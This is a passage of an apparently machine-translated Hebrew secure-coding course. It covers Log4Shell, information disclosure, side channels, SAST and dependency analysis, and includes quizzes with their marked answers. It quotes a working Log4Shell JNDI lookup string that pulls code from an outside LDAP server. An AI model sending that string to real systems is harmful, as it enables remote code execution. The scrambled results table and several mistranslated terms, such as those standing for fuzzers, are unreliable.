> log4j הוא רכיב תוכנה שנכתב ב- Java המיישם רישום (הקלטת אירועים לביקורת מאוחרת יותר וניפוי באגים). הוא נמצא בשימוש נרחב לרישום, כולל על ידי אייפונים של אפל, טסלה וצ'אט מיינקראפט. Log4Shell (באופן רשמי CVE-2021-44228) הוא פגיעות חמורה ביותר בסדרת log4j 2.X. בגרסאות פגיעות של log4j, "תוקף שיכול לשלוט בהודעות יומן רישום או בפרמטרים של הודעות יומן רישום יכול להפעיל קוד שרירותי שנטען משרתי LDAP כאשר החלפת חיפוש הודעות מופעלת." (NVD,  [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) קל להפעיל; תוקף יכול לכלול טקסט רשום עם טפסים כגון `${jndi:ldap://45.83.193.150:1389/Exploit}`. היו כמעט 8,000 בדיקות בפרויקט log4j, אך אף אחת מהן לא מצאה זאת; הבדיקות הראו שהפונקציות הצפויות עבדו, אך לא הבטיחו שהפונקציונליות הבלתי רצויה הזו לא תעבוד. זוהי דוגמה לאפשר למשתמשים לא מהימנים לשלוט בפורמט הפלט, במקרה זה המאפשר ביצוע קוד שרירותי. היזהר מלתת למשתמשים לא מהימנים את רמת השליטה המסוכנת הזו!


#### חידון 4.10: עיצוב מחרוזות ותבניות

\>\>בחר את כל המשפטים האמיתיים.<<

[!x] כאשר הדבר מעשי, אל תאפשר למשתמשים לא מהימנים לשלוט בפורמט/תבנית המשמשים בעת עיצוב פלט.

[x] העיצוב של C מניח שפרמטרים של מחרוזת פורמט הם ממקורות מהימנים.

[ ] לאחר מנגנון כדי לפשט את עיצוב הפלט הוא יוצא דופן בשפות תכנות.

### מזעור משוב / חשיפת מידע

הימנע ממסירת אבטחה או מידע רגיש למשתמשים לא מהימנים. אם בקשה היא חסויה, פשוט להצליח או להיכשל, ואם היא נכשלת פשוט לומר שהיא נכשלה ולמזער את המידע על למה זה נכשל. בקיצור, צמצם את המשוב למשתמשים לא מהימנים אם הוא עלול לפגוע באבטחה, ובמקום זאת שלח את המידע המפורט ליומני ביקורת של שבילים. לדוגמה:

* אם התוכנית שלך דורשת אימות משתמש כלשהו (לדוגמה, אתה כותב שירות רשת או תוכנית כניסה), תן למשתמש מידע מועט ככל האפשר לפני שהוא מבצע אימות. בפרט, הימנע ממסירת מספר הגירסה של התוכנית לפני האימות. אחרת, אם גירסה מסוימת של התוכנית שלך מתגלה כבעלת פגיעות, משתמשים שאינם משדרגים מגירסה זו מפרסמים לתוקפים שהם פגיעים.

* אם התוכנית שלך מקבלת סיסמה, כברירת מחדל אל תציג את הסיסמה המלאה בעת הזנתה. לכל היותר, הצג את הדמות האחרונה שהוזנה. הצגת הסיסמה המלאה בעת הזנתה עשויה לאפשר לאחרים לראות את הסיסמה. בטופסי HTML, הגדר את סוג הקלט לסיסמה, המגבילה במכוון את המשוב. ממשקי משתמש רבים מאפשרים למשתמשים לבחור להציג מידע רגיש על-ידי לחיצה על סמל עין; זה בסדר, מכיוון שהתצוגה היא לפי בקשת משתמש ספציפית במקום כברירת מחדל.

* בכניסה שנכשלה, פשוט אמור* "שם המשתמש או הסיסמה נכשלו*" או דומה - אל תחשוף אם זה היה שם המשתמש או הסיסמה שנכשלו. זה יכול לומר לתוקף ששם המשתמש תקף, ומקל על התקפות נוספות.

* אם משתמש מנסה ליצור חשבון באמצעות כתובת דואר אלקטרוני, אל תודיע למשתמש אם כבר קיים חשבון עם כתובת דואר אלקטרוני זו. באופן דומה, אם משתמש מנסה לבצע איפוס סיסמה באמצעות כתובת דואר אלקטרוני, אל תודיע למשתמש אם אין חשבון עם כתובת דואר אלקטרוני זו. מסירת מידע זה תאפשר לתוקף לקבוע אם כתובת דואר אלקטרוני ספציפית נמצאת בשימוש (או לא) על-ידי חשבון קיים כלשהו.

* באופן כללי, אל תציג נתונים רגישים/פרטיים כברירת מחדל, אלא אם כן הדבר נחוץ בשלב זה.

הטמע רישום ביקורת בשלב מוקדם בפיתוח. לאחר מכן, אם עליך לתעד מידע מפורט יותר כדי לסייע באיתור באגים, דווח על מידע זה ביומני הרישום במקום להציג אותו למשתמש. יומני ביקורת נוחים מאוד לאיתור באגים (מכיוון שהם נועדו לתעד מידע שימושי מבלי להפריע לפעולות רגילות), וסביר יותר שתכלול מידע מצב שימושי ביומני הרישום אם הם מפותחים במקביל לשאר התוכנית. הם גם יפחיתו את הפיתוי לחשוף יותר מדי למשתמשים לא מהימנים.

כמו כן, ודא שמשתמשים אינם יכולים לקבל מידע לא מורשה. יש להגדיר בבירור הרשאות ומרחבי שמות כדי למנוע זאת.

 חשיפת מידע לא נכונה היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #20 ו- 2019 CWE Top 25 #4. הוא מזוהה כ [- CWE-200](https://cwe.mitre.org/data/definitions/200.html), *חשיפה של מידע רגיש לשחקן לא מורשה* (המכונה *חשיפת מידע*).

#### חידון 4.11: מזעור משוב / חשיפת מידע

\>\>אם משתמש לא מהימן מתחבר למערכת שלך דרך רשת, ובקשה נכשלת, עליך לספק לו מעקב מחסנית מפורט. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

אנחנו מקווים שזה היה ממש קל. הבעיה היא לא רק שמדובר בחוויית משתמש נוראית; זה גם יכול להוביל לפרצת אבטחה. בדרך כלל יש לומר למשתמשים לא מהימנים אם בקשה כלשהי נכשלה, אך אין סיבה שהם חייבים לראות את כל הפרטים האלה; בשביל זה יש יומנים.

[הסבר]

### התקפות בערוץ צדדי

במקרים מסוימים, התוכנה שאתה מפתח עשויה לשלוח פלט רלוונטי לאבטחה שלא התכוונת לשלוח.

 *התקפת ערוץ צדדי* היא התקפה שבה תוקף משיג מידע לא מורשה על ידי ניצול אופן יישום התוכנה (במקום חולשה באלגוריתם או פגם). ישנם סוגים רבים ושונים של התקפות ערוץ צדדי; הנה כמה דוגמאות:

* התקפת תזמון – התקפה המבוססת על מדידת הזמן שלוקח חישובים שונים. זה אפילו אפשרי לבצע כמה התקפות תזמון על רשת, שכן הסטטיסטיקה המודרנית יכולה להתמודד עם כמות משמעותית של ריצוד.

* התקפת מטמון — התקפה המבוססת על ניטור גישה למטמון, בדרך כלל בסביבה פיזית משותפת (כגון שירות ענן).

* התקפת ניטור חשמל - התקפה המבוססת על התבוננות בצריכת חשמל משתנה.

* שחזור נתונים - התקפה המבוססת על קריאת נתונים לאחר שחשבו שהם נמחקו.

מערכות הצפנה הן לעתים קרובות המטרות של התקפות אלה, ולכן ספריות המיישמות קריפטוגרפיה צריכות להיות מיושמות במיוחד כדי לנסות להתמודד עם התקפות כאלה. נדון בכך ביתר פירוט כאשר נדון בקריפטוגרפיה.

אם אתה צריך להתמודד עם התקפות מסוג זה, מעבר למה שנדרש עבור קריפטוגרפיה, התקפות ערוץ צדדי יכול להיות קשה לסכל. אם חשוב מאוד להתמודד עם התקפות ערוץ צדדי, לעתים קרובות עדיף לשלם כדי לבטל את שיתוף המשאבים והגישה המאפשרים ערוצים צדדיים. לדוגמה, אם התקפות מטמון מהוות בעיה רצינית, תוכל לבחור להשתמש בחומרה חד-תכליתית או לשלם לספק ענן כדי להפחית את השיתוף (לדוגמה, להשתמש בארכיטקטורה של דייר יחיד). ניתן להתמודד עם התקפות ניטור חשמל על ידי הקשה על התוקף למדוד את השימוש בחשמל.

למרבה המזל, מלבד התקפות על מערכות קריפטוגרפיות, התקפות ערוץ צדדי פחות נפוצות כיום. רוב המפתחים צריכים להתמקד בנושאים האחרים שנדונו בקורס זה, ורק אז (בנסיבות מיוחדות יותר) הם צריכים לדאוג מהתקפות ערוץ צדדי. תוקפים בדרך כלל לא יטרחו לנסות ליישם התקפת ערוץ צדדי אם התוכנה מלאה בפגיעויות קלות יותר לאיתור כגון XSS והצפות מאגר.

# חלק ב': בחינת גמר

* לא כלול כחלק מהגרסה החינמית של הקורס.

# חלק ג': אימות ונושאים מיוחדים יותר

# אימות

פרק זה מתאר כיצד לאמת אבטחה, כולל מגבלות הכלים, המשמעות  של *ניתוח סטטי *וניתוח דינמי*, וסוגים נפוצים של כלים כגון סורקי קוד אבטחה/כלי בדיקת אבטחת יישומים סטטיים (SAST), חומרי לייזר וסורקי יישומי אינטרנט.* 

מטרות הלמידה:

1. הבן את כלי האימות, כולל הבעיות של תוצאות חיוביות כוזבות ותוצאות שליליות שגויות.

2. דון בסוגים נפוצים של כלי ניתוח סטטיים, כולל סורקי קוד אבטחה/כלי בדיקת אבטחת יישומים סטטיים (SAST).

3. דונו בסוגים נפוצים של כלי ניתוח דינמיים, כולל תנורי מים וסורקי יישומי אינטרנט.

## יסודות האימות

### סקירה כללית של אימות

אימות יכול להיות מוגדר כקביעה אם משהו עומד בדרישות שלו או לא (כולל תקנות, מפרטים וכן הלאה). בדיקה היא גישת אימות אחת, אבל אימות הוא יותר מבדיקה. אנחנו רוצים לוודא (ברמה סבירה כלשהי) שהתוכנה שלנו מאובטחת, בדיוק כמו שאנחנו רוצים לוודא שהתוכנה שלנו עושה דברים אחרים שהיא אמורה לעשות.

#### גישות אימות

ישנן שתי קטגוריות טכניות עיקריות של אימות:

* **ניתוח סטטי** הוא כל גישה לאימות תוכנה (כולל מציאת פגמים) ללא הפעלת תוכנה. זה כולל כלים שבודקים קוד מקור שמחפש פגיעויות (למשל, כלי סריקת פגיעות של קוד מקור). זה כולל גם בני אדם שקוראים קוד, מחפשים בעיות.

* **ניתוח דינמי** הוא כל גישה לאימות תוכנה (כולל איתור פגמים) על ידי הפעלת תוכנה על קלטים ספציפיים ובדיקת התוצאות. בדיקות מסורתיות הן סוג של ניתוח דינמי. בדיקת Fuzz, שבה אתה שולח ** קלטים אקראיים רבים לתוכנית כדי לראות אם היא עושה משהו שהיא לא צריכה, היא גם דוגמה לניתוח דינמי.

יש אנשים שיש להם גם קטגוריה שנקראת *אנליזה* היברידית  לגישות המשלבות את שתיהן, בעוד שאחרים יכללו גישות היברידיות בקטגוריית הניתוח הדינמי.

#### דיווחים אמיתיים ושקריים

יש היסטוריה ארוכה של שימוש בסוגים שונים של גלאים כדי לזהות מצבים חשובים, שרבים מהם אינם קשורים לתוכנה. גלאי עשן, למשל, מנסים לאתר עשן משריפות מסוכנות. למרבה הצער, גלאים לעולם אינם מושלמים.

בתחום האבטחה לעתים קרובות אנו רוצים להשתמש בכלים שמוצאים סוגים מסוימים של פגיעויות ומדווחים עליהן. באופן אידיאלי, כלי כזה לזיהוי פגיעויות תמיד ידווח בדיוק על הפגיעויות שאתה רוצה שהוא ידווח, ולא שום דבר אחר. שוב, אידיאלים כאלה מתרחשים לעתים רחוקות במציאות. אז כלי יכול לדווח על משהו או לא, והדוח או אי-הדיווח הזה עשויים להיות נכונים או לא נכונים, מה שמוביל ל-4 אפשרויות:

<table>
  <tr>
    דוח <td><b>
     </b></td>ניתוח/כלי<td><b> דיווח נכון</b></td>
    <td><b> דיווח שגוי</b></td>
  </tr>
  <tr>
    <td><b> דיווח (פגם)חיובי אמיתי (TP): דיווח נכון (פגם)</b>תוצאה חיובית שגויה (FP</td>): דיווח<td><i> שגוי (של "פגם" שאינו פגם</i>) ("שגיאת סוג I")לא דווח (</td>פגם (שם<td><i>)שלילי אמיתי (TN): לא דווח כראוי (פגם נתון</i>)</td>שלילי</tr>
    <tr> כוזב (<td><b>FN)</b>
    </td>
    <td><i>
  </i>
  </td>
    <td><i>
    </i> שגוי מכיוון שהדיווח נכשל (פגם) ("שגיאת Type II"):</td>
  </tr>
</table>


המציאות היא שבדרך כלל יש פשרה בין תוצאות חיוביות כוזבות לשליליות כוזבות. ניתן לתכנן או להגדיר כלים כך שיהיו פחות תוצאות חיוביות כוזבות (דיווחים שגויים), אך חוסר רגישות זה בדרך כלל אומר שלעתים קרובות יהיו בו יותר תוצאות שליליות כוזבות (הוא לא יצליח לדווח על דברים שאתה עשוי לצפות שהוא ידווח עליהם). לפרטים נוספים, עיין [*בדוח SATE V: עשר שנים של תערוכות כלי ניתוח סטטי*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf), 2018.

#### החלת כלים

אם אתה מוסיף כלי לפרוייקט קיים, ייתכן שתרצה להגדיר כלים כך שיגבילו במידה ניכרת את מה שהם מדווחים עליו, ויתמקדו רק בפגיעויות המדאיגות אותך ביותר. זה נותן לך זמן ללמוד כיצד לכוונן ** את  הכלי ולהבין את התוצאות שלו. לאחר מכן, לאחר שתוצאות אלה יטופלו, הגבר את הרגישות של הכלים שלך או הוסף כלים נוספים כדי לזהות בעיות נוספות. אין טעם לנסות לזהות יותר בעיות ממה שאתה יכול להתמודד איתן.

אם אתה מוסיף כלים לפרוייקט שהתחיל לאחרונה, לעתים קרובות עדיף לך להגדיר את הכלים שלך כך שיהיו רגישים מאוד. בפרויקט חדש, אתה לא תהיה המום על ידי הדוחות, ואתה מיד תקבל משוב על הבעיות הכלים שלך יכול לזהות.

היכן אתה מוסיף כלים אלה? בקיצור, הוסף כלים אלה באופן מקסימלי לפחות לצינור האינטגרציה הרציף (CI) שלך. בדרך זו, שינויים מצטברים ינותחו שוב ושוב ובעיות אבטחה ידווחו מוקדם.

חלק מהכלים הם OSS, בעוד שאחרים הם קנייניים. חלק מהכלים הקנייניים הם יקרים, אך אם אתה משתמש בהם כדי לפתח OSS, כלים ו / או שירותים רבים הם בחינם לשימוש או זמינים בהנחה משמעותית.

אז בואו נסתכל על כמה סוגים של כלים שבהם אתה יכול להשתמש כדי לעזור להפוך את התוכנה שלך למאובטחת.

#### חידון 1.1: סקירה כללית של אימות

\>\>כאשר משתמשים בכלים כדי לחפש פגיעויות אבטחה, בדרך כלל קיים סיכון של "תוצאות שליליות כוזבות" - כלומר, אי דיווח על פגיעויות גם כאשר הן קיימות והכלי נועד למצוא סוג כזה של פגיעות. אמת או שקר?<<

(x) נכון

( ) לא נכון

## אנליזה סטטית

### סקירה כללית של ניתוח סטטי

ניתוח סטטי הוא כל גישה לאימות תוכנה (כולל מציאת פגמים) ללא הפעלת תוכנה. זה כולל בני אדם שבודקים קוד. הוא כולל גם כלים שבודקים קוד מקור, קוד בתים ו/או קוד מכונה.

#### ביקורת אנושית

בני אדם יכולים להיות מדהימים במציאת פגמים. זהו אחד היתרונות הפוטנציאליים הגדולים של תוכנת קוד פתוח (OSS); מכיוון שכל אחד יכול לסקור את קוד המקור של OSS כדי למצוא פגמים, קיימת ביקורת עמיתים המונית פוטנציאלית. אבל לבני אדם יש חסרונות. הזמן האנושי יקר, בני האדם משתעממים, ולבני האדם יש ימי "חופש" שבהם הם פחות יעילים (למשל, הם עלולים לפספס דברים). גם לבני אדם שונים יש רמות שונות של יעילות. זה נהדר שבני אדם בודקים קוד, אבל אתה גם רוצה לתמוך בבני אדם עם כלים שימצאו בעיות שבני האדם עלולים לפספס.

אם אתה יכול לגרום לבני אדם לבדוק קוד, עשה זאת! אבל אולי כדאי לכוון את בני האדם לבחון נושאים שהכלים במיוחד לא טובים בהם. בפרט, טוב שאנשים יבדקו את "נקודות הכניסה" (משטח התקיפה) מעבר לגבול אמון כדי לוודא שכל בקשה מאושרת או נדחית. הקביעה אם בקשה מאושרת או לא היא לא משהו שרוב הכלים טובים בו (חסר להם המידע לקבלת ההחלטה). מה שכן, אם הניתוח הזה קשה מדי לבני אדם, יש משהו לא בסדר בתוכנה - זה אמור להיות *קל* יחסית  לענות על השאלה הזו בכל נקודת כניסה.

באופן כללי, אם יש בעיות שכלים אינם טובים במציאתן, ייתכן שעדיף לשנות את העיצוב שלך כך שהבעיה לא תוכל לקרות מלכתחילה. לדוגמה, בחר שפה בטוחה לזיכרון או עצב רכיב מערכת כך שניתן יהיה לבצע בקשות בטוחות בלבד. אם זה לא עובד, זה יכול להיות חכם לנסות למצוא או לפתח כלי כדי למצוא אותו. עם זאת, תמיד יהיו נושאים שכלים לא יעבדו טוב עבורם. אם שום דבר אחר לא עובד, אז לעבוד כדי למקד את הכלי החזק ביותר של כל על הבעיה: אנשים. אבל זמנם של אנשים מוגבל, אז איפה שאתה יכול, נסה לא להסתמך *רק* על ביקורת אנושית.

 תהליך בדיקה אנושי לשינויי קוד ותצורה, כדי למזער את הסיכוי שקוד או תצורה זדוניים יוכנסו לצינור התוכנה שלך, הוא חלק מ- 2021 OWASP Top 10 #8 (A08:2021), *כשלים בתקינות תוכנה ותקינות נתונים*. תהליכי סקירה אנושיים יכולים לעזור להתמודד עם *בקרת גישה שבורה*, 2017 OWASP Top 10 #5 ו- 2021 OWASP Top 10 #1.

אז עם זאת, בואו נתחיל לדון בכלים שיעזרו לנו.

#### כלים גנריים למציאת באגים: כלים איכותיים, אזהרות מהדר וכלי בדיקת סוג

כלים מסוימים בוחנים קוד מקור, קוד בית או קוד מכונה כדי לחפש בעיות "איכות" גנריות. לדוגמה, הם עשויים לחפש כניסה מטעה, שילובים של מבנים שבדרך כלל מצביעים על פגם, או שיטות ארוכות מדי שעשויות להיות קשות להבנה מאוחר יותר. יש מגוון גדול של אלה, כולל דגלי אזהרה מהדר, בודקי סגנון, וכן הלאה. הכלים עצמם הם לעתים קרובות זולים או חינמיים, ולעתים קרובות הם פועלים במהירות, מכיוון שהם בדרך כלל לא צריכים לעשות ניתוח מעמיק.

כלים אלה לעתים קרובות אינם מתמקדים באבטחה, אך השימוש בהם עדיין יכול לסייע בשיפור האבטחה:

1. חלק מהפגמים שהם מוצאים הם פגיעויות אבטחה.

2. ישנם דיווחים שקוד *נקי* קל יותר לכלים אחרים ולבני אדם להבין... כך שתיקון הבעיות המדווחות יכול להפוך גישות אחרות ליעילות יותר.

אם אתה מתחיל פרוייקט חדש, חשוב להפעיל כמה שיותר מהכלים האלה (כולל אזהרות מהדר) בהקדם האפשרי. אם תפעיל אותם מוקדם, תראה כמה דוחות הממליצים על גישה שונה ופשוט השתמש בה במקום זאת. אם תנסה להוסיף אותם לפרוייקט *קיים*,  לעתים קרובות תראה הרבה יותר מדי בעיות לתיקון, למרות שהסיכוי שאחת מהן תהיה בעיה רצינית הוא קטן. לכן, אם יש לך פרוייקט קיים, בדרך כלל עליך להוסיף כלים אלה באיטיות, לקבוע את תצורתם כך שידווחו רק על קבוצת משנה (כגון רק דוחות המופעלים על-ידי שינוי) ולאחר מכן להרחיב בהדרגה את מה שהם מדווחים עליו.

הערות דומות חלות על בדיקת כתב סטטי. שפות תיכנות מסוימות כוללות בדיקות מוכללות עבור סוגים בעלי הצהרה סטטית. ישנם יתרונות וחסרונות לטיפוסים מוצהרים סטטיים. לוקח זמן לקבוע ולציין סוגים, כך שזה יכול להאט את הפיתוח הראשוני, שהוא שלילי עבור תוכניות קטנות וזרוקות. עם זאת, הצהרות סטטיות אלה יכולות לסייע באיתור אוטומטי של סוגים מסוימים של פגמים, כמו גם בכלי סיוע לתמיכה ובאופטימיזציה. אם אתה משתמש בשפת תיכנות עם בדיקת הקלדה סטטית, עבוד עם מערכת הכתב כדי להשתמש בה כדי לסייע באיתור פגמים בשלב מוקדם.

עם זאת, בעוד שכלים אלה הם לעתים קרובות קלים לשימוש, הם בדרך כלל אינם מתמקדים בנושאי אבטחה... ולכן לעתים קרובות הם מפספסים בעיות אבטחה. בואו נדבר על כלים המשתמשים בניתוח סטטי במיוחד כדי למצוא פגיעויות אבטחה.

#### סורקי קוד אבטחה/כלי בדיקת אבטחת יישומים סטטיים (SAST)

חלק מהכלים מנתחים קוד ומחפשים נקודות תורפה. הם הולכים על ידי מגוון רחב של שמות, כגון כלי בדיקת אבטחת יישומים סטטיים (SAST), סורקי קוד אבטחה, סורקי קוד מקור אבטחה (אם הם בוחנים קוד מקור), סורקי קוד בינאריים (אם הם בוחנים רק קבצי הפעלה), או רק *מנתחי קוד סטטיים*. יש אנשים שמשתמשים במונח SAST רק כאשר הכלי מנתח קוד מקור (לפרטים נוספים, ראה [*מרק האלפבית של AppSec: מדריך ל- SAST, IAST, DAST ו- RASP*](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/) מאת Fred Bals, 2018, ו- 10 סוגים של כלי בדיקת אבטחת יישומים: מתי וכיצד להשתמש בהם[* מאת Thomas Scanlon, 2018), אך לא נגביל את המונח כך.*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html) 

הרעיון מאחורי כלים אלה הוא שלפגיעויות רבות יש דפוסים ספציפיים. כלי שנועד לחפש דפוסים אלה יכול לדווח על סוגים דומים של פגיעויות.

הדפוסים הם בדרך כלל היוריסטיים, וכלים שונים בדרך כלל מחפשים דפוסים שונים. אז כלי אחד יכול למצוא *כמה* נקודות  תורפה, אבל אל תטעו לחשוב שכל אחד מהכלים האלה מוצא  את *כל* נקודות התורפה. בנוסף, כל כלי יחפש רק תבניות רלוונטיות לקבוצה מסוימת של שפות/סביבות. זה אומר שהכלים האלה טובים רק לשפות/סביבות שהם נועדו לתמוך בהן, ובנוסף, כלי עשוי להיות טוב יותר בשפה אחת מאשר באחרת. גם בהינתן כלים מרובים שנועדו לתמוך בשפה נתונה, כלים שונים ימצאו לעתים קרובות נקודות תורפה שאחרים מפספסים.

אם המטרה העיקרית שלך היא למצוא כמה שיותר פגיעויות, עדיף להשתמש בכלים מרובים, אפילו במספר כלים מאותו סוג, כך שפגיעות שלא זוהתה על ידי כלי אחד עשויה להיות מזוהה על ידי כלי אחר. למרבה הצער, שימוש בכלים מרובים יכול להיות יקר בכסף ובמאמץ. חלק מהכלים יקרים, ולא משנה מה, לוקח זמן להגדיר את הכלי לשימוש הספציפי שלו ולנתח את הדוחות שלו. כפי שקורה לעתים קרובות, יש פשרה; סט הכלים שתבחר יושפע מאוד מהמשאבים הזמינים, כמו גם מהסבירות וההשפעה הצפויות של פגיעויות לא מבוססות.

כמובן, לא כל מה שמדווח על ידי כל אחד מהכלים האלה הוא ** נקודת תורפה ממשית. לכל הכלים הללו יש סיכון מסוים ליצירת תוצאה חיובית שגויה. לדוגמה, כלי עשוי לזהות פגיעות המופעלת על-ידי קלט מסוים, אך ייתכן שתדע שרק משתמש מהימן יכול לשלוט בקלט זה... כך שבעוד שהכלי נכון במובן אחד, הוא אינו מהווה למעשה נקודת תורפה. במקרים רבים, עדיף לתקן את הדוח בכל מקרה; לעתים קרובות אנשים טועים כשהם אומרים שמשהו "לא יכול" לקרות, והתוכנה או הסביבה שלה עשויות להשתנות בעתיד (כך שתיקון זה יבטיח את התוכנה בעתיד). אם אתה בטוח שהדוח הוא תוצאה חיובית שגויה, ו"תיקון " הקוד כדי לבטל את הדוח אינו שווה את הטרחה, לרוב הכלים הללו יש דרך להשבית את הדוח (למשל, באמצעות הערה בקוד המקור). בדרך זו, הכלי יפסיק לדווח על כך; אחרת דוחות הכלי יהיה לאורך זמן רק קבוצה גדולה של תוצאות חיוביות כוזבות. רק הקפד להשבית דוח רק אם אתה *בטוח* שמדובר בתוצאה חיובית שגויה.

#### סורקי קוד אבטחה מיוחדים / כלי SAST

חלק מהכלים נועדו לחפש רק סוג אחד או מעט מאוד של פגיעויות. אלה עדיין סורקי קוד אבטחה, המכונים כלי SAST, אך מכיוון שהם נכתבו במיוחד כדי לבצע ניתוח ספציפי אחד, הם יכולים לפעמים להיות טובים יותר בניתוח אחד זה מאשר כלי למטרות כלליות יותר שנועד למצוא סוגים רבים ושונים של פגיעויות. בנוסף, כמה כלים כלליים יותר לא מחפשים את הבעיות הספציפיות האלה בכלל.

הנה כמה סוגים של פגיעויות שכלי SAST מיוחדים יכולים לזהות:

* פגיעויות מניעת שירות של ביטוי רגולרי (ReDoS) (כלומר, ביטויים רגולריים עם ביצועים גרועים ביותר). אתה יכול לחפש מונחים כמו "ReDoS", "regex רע", ו "regex בטוח". אלה מחלצים את הביטויים הרגילים מקוד המקור, ולאחר מכן מנתחים את הביטויים הרגולריים.

* אישורים מקודדים באופן קשיח כגון מפתחות הצפנה וסיסמאות. כלים המחפשים אישורים מקודדים באופן קשיח נקראים לעתים "סורקים סודיים".

אישורים מקודדים באופן  קשיח הם בעיה נפוצה כל כך שהם 2021 CWE Top 25 #16, CWE-798, [](https://cwe.mitre.org/data/definitions/798.html) *שימוש באישורים מקודדים באופן קשיח*. זו אחת הסיבות לכך שסורקים סודיים הפכו במהירות לפופולריים.

#### כלי ניתוח סטטיים אחרים

ישנם סוגים רבים אחרים של כלי ניתוח סטטיים.

סוג אחד הוא כל כך חשוב שאנחנו נקדיש לו סעיף נפרד שלם. לסוג הניתוח שכלים אלה עושים יש מגוון שמות, כולל ניתוח הרכב תוכנה (SCA), ניתוח תלות וניתוח מקור. לא משנה איך זה נקרא, זה חשוב, אז נדון על זה הבא.

#### חידון 1.2: סקירה כללית של ניתוח סטטי

\>\>סורקי קוד אבטחה/בדיקות אבטחת יישומים סטטיים (SAST) כלים בודקים קוד כדי לחפש פגיעויות. הם יכולים להיות שימושיים מאוד, אבל כלי כזה יכול לדווח על שום פגיעויות אפילו על תוכנה עם פגיעויות. אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון. הם שימושיים, ובאופן כללי אתה צריך להשתמש לפחות בכלי אחד כזה, אבל אל תלך שולל לחשוב כי פשוט באמצעות כלים כאלה מבטל פגיעויות תוכנה.

[הסבר]

### ניתוח הרכב תוכנה (SCA)/ניתוח תלות

סוג אחד של כלי ניתוח סטטי הוא כל כך חשוב שאנחנו רוצים לדון בו בנפרד. לסוג הניתוח שכלים אלה עושים יש מגוון שמות, כולל ניתוח הרכב תוכנה (SCA), ניתוח תלות וניתוח מקור. לא משנה איך זה נקרא, זה חשוב. בואו נבחן תחילה *מדוע* זה חשוב.

#### הצורך ב- SCA

לפני זמן רב, מפתחי תוכנה כתבו את רוב התוכנה ביישום שלהם. כיום, זה כמעט אף פעם לא המצב. במקום זאת, מפתחי תוכנה בדרך כלל עושים שימוש חוזר בחבילות תוכנה שנכתבו ברובן על-ידי אחרים, ולאחר מכן כותבים רק את הפונקציונליות המיוחדת ואת קוד הדבק הדרושים כדי לגרום לדברים לעבוד יחד בדרך הרצויה. הדבר חל גם על חבילות תוכנה הניתנות לשימוש חוזר; חבילות אלה תלויות בדרך כלל בחבילות, התלויות באחרים, וכן הלאה. הדבר נכון גם לגבי מערכות הפעלה עצמאיות, תמונות של מכונות וירטואליות ותמונות של מכולות - הן כוללות לעתים קרובות הרבה תוכנות שנכתבו על ידי אחרים.

ישנם יתרונות ברורים לשימוש חוזר בתוכנה. יתרון אחד הוא שזה חוסך הרבה זמן (וכסף) - אתה לא צריך לפתח את הקוד הזה! יתרון נוסף הוא כי חבילה בשימוש חוזר הוא לעתים קרובות טוב במיוחד במשימה זו (שכן מישהו בילה זמן במיוחד כדי לפתור את הבעיה); חבילות אלה מטפלות לעתים קרובות במקרי קצה שאחרת היית עלול לשכוח.

אבל כשאתה עושה שימוש חוזר בתוכנה, יש חיסרון: לתוכנה יהיו נקודות תורפה. עליך לנסות לבחור תוכנה שסביר להניח שיהיו לה פחות פגיעויות. אבל באופן כללי, פגיעויות *יימצאו* בתוכנה שבה אתה משתמש במישרין ובעקיפין; פגיעויות אלה יוכרזו בפומבי, ועדכונים לרכיבים הפותרים את הפגיעויות ישוחררו. מכיוון שרוב התוכנות הנמצאות בשימוש חוזר הן OSS, אנשים וחברות מסוימים מכנים זאת בדיקה עבור OSS. זה לא ממש נכון, כי זה למעשה בעיה עבור כל תוכנה בשימוש חוזר, אבל זה מובן כי אנשים מתמקדים OSS כי רוב התוכנות בשימוש חוזר הוא OSS.

שימוש ברכיבים  ידועים-פגיעים הוא בעיה כה נפוצה שבשנת 2013  OWASP הוסיף *שימוש ברכיבים עם פגיעויות ידועות* ל- OWASP Top 10. שימוש ברכיבים עם פגיעויות ידועות הוא 2017 OWASP Top 10 #9. שימוש ברכיבים פגיעים ומיושנים הוא 2021 OWASP Top 10 #6.

זה בלתי נמנע שתצטרך לעדכן במהירות רכיבים פגיעים שנעשה בהם שימוש חוזר, ולכן עליך *להתכונן* לזהות במהירות ולבצע עדכוני אבטחה עבור התוכנה הנמצאת בשימוש חוזר ביישומים שלך.

#### הכנה לבלתי נמנע: פגיעויות בתלות שלך

חלק מרכזי בהכנה שלך הוא להשתמש בכלי שיכול לקבוע באיזו תוכנה אתה עושה שימוש חוזר, ולדווח על כל פגיעויות הידועות לציבור ברכיבים אלה שנעשה בהם שימוש חוזר. לכלים שיכולים לזהות רכיבים בשימוש חוזר יש שמות שונים, כולל כלי ניתוח הרכב תוכנה (SCA), כלי ניתוח רכיבי תוכנה, כלי ניתוח תלות או כלי ניתוח מקור. מבחינה היסטורית, רבים מהכלים הללו פותחו לבדיקה משפטית, כדי להבטיח שכל התוכנות שנעשה בהן שימוש חוזר משמשות בהתאם לרישיונות שלהן, שהרישיונות (כפי שנעשה בהם שימוש) תואמים, ושיש רישיונות לכל זה. מומלץ מאוד לכלול ניתוח רישיונות מסוג זה בכל פעם שאתה מנסה לכלול או לעדכן תוכנה שנעשה בה שימוש חוזר. אבל למטרות שלנו, נתמקד בכלים המשווים רשימה זו של רכיבים (כולל מספרי הגירסה שלהם) עם מסדי נתונים של פגיעויות ידועות.

ישנם מסדי נתונים זמינים לציבור של תוכנות עם פגיעויות ידועות לציבור; מסד נתונים נפוץ במיוחד הוא מסד הנתונים הלאומי לפגיעות בארה"ב (NVD). ה- NVD הוא מסד נתונים זמין לציבור של פגיעויות הידועות לציבור, שכולן מזוהות על-ידי מזהה CVE (לכל פגיעות יש מזהה CVE שונה) בשילוב עם רשימה של מוצרים ומספרי גרסאות הידועים כבעלי פגיעות זו. לחלק מהספקים המסחריים יש גם מאגרי מידע משלהם.

